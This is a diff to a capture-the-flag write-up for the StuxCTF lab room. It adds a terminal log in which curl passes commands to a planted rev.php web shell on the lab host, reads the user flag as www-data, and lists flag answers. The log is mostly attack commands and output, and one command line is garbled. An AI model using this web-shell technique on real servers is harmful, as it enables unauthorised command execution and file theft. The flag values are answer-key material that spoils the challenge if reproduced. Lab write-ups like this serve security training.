@@ -90,8 +90,8 @@ What is the hidden directory? <code>HINT: g ^ a mod p, g ^ b mod p, g ^ C mod p<
 <br>
 
 
-> 1.1. <em>What is the hidden directory?</em> Hint : <em>  g ^ a mod p, g ^ b mod p, g ^ C mod p | first 128 characters ... </em><br><a id='1.3'></a>
->> <strong><code>47315028937264895539131328176684350732577039984023005189203993885687328953804202704977050807800832928198526567069446044422855055</code></strong><br>
+> 1.1. <em>user.txt </em><br><a id='1.1'></a>
+>> <strong><code>0b6044b7807dd100b9e30f1bd09db53f</code></strong><br>
 <p></p>
 
 
@@ -218,7 +218,43 @@ unserialize(file_get_contents($file_name));<br />
 ![image](https://github.com/user-attachments/assets/abe93ff2-d22b-4f15-bc50-275ea52b0502)
 
 
+<br>
 
+```bash
+:~/StuxCTF# curl -s http://stuxctf.thm//4731502893726489553913132817668435073257703root@ip-10-10-17-38:~/StuxCTF# curl -s http://stuxctf.thm//47315028937264895539131328176684350732577039984023005189203993885687328953804202704977050807800832928198526567069446044422855055/rev.php --get --data-urlencode "cmd=id"
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+:~/StuxCTF# curl -s http://stuxctf.thm//47315028937264895539131328176684350732577039984023005189203993885687328953804202704977050807800832928198526567069446044422855055/rev.php --get --data-urlencode "cmd=pwd"
+/var/www/html/47315028937264895539131328176684350732577039984023005189203993885687328953804202704977050807800832928198526567069446044422855055
+:~/StuxCTF# curl -s http://stuxctf.thm//47315028937264895539131328176684350732577039984023005189203993885687328953804202704977050807800832928198526567069446044422855055/rev.php --get --data-urlencode "cmd=ls"
+assets
+index.php
+rev.php
+shell.php
+:~/StuxCTF# curl -s http://stuxctf.thm//47315028937264895539131328176684350732577039984023005189203993885687328953804202704977050807800832928198526567069446044422855055/rev.php --get --data-urlencode "cmd=ls /home"
+grecia
+:~/StuxCTF# curl -s http://stuxctf.thm//47315028937264895539131328176684350732577039984023005189203993885687328953804202704977050807800832928198526567069446044422855055/rev.php --get --data-urlencode "cmd=ls /home/grecia"
+user.txt
+:~/StuxCTF# curl -s http://stuxctf.thm//47315028937264895539131328176684350732577039984023005189203993885687328953804202704977050807800832928198526567069446044422855055/rev.php --get --data-urlencode "cmd=cat /home/grecia/user.txt"
+0b6044b7807dd100b9e30f1bd09db53f
+:~/StuxCTF# 
+
+```
+
+<br>
+<br>
+
+
+> 1.2. <em>root.txt </em><br><a id='1.2'></a>
+>> <strong><code>______________f</code></strong><br>
+<p></p>
+
+
+<br>
+
+
+
+
+<br>
 
 
 <h1 align="center"> $$\textcolor{#3bd62d}{\textnormal{Room Completed}}$$</h1>
